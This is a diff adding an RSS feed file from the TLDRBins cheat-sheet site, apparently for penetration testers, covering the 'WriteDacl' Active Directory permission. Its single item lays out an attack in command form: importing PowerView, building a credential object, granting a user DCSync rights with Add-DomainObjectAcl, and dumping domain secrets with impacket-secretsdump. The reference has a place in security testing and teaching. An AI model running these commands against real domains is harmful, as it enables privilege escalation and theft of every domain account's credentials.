@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>WriteDacl on TLDRBins</title>
+    <link>https://tldrbins.github.io/@writedacl/</link>
+    <description>Recent content in WriteDacl on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@writedacl/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description> Abuse #1: Add dcsync right to user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
+    </item>
+  </channel>
+</rss>
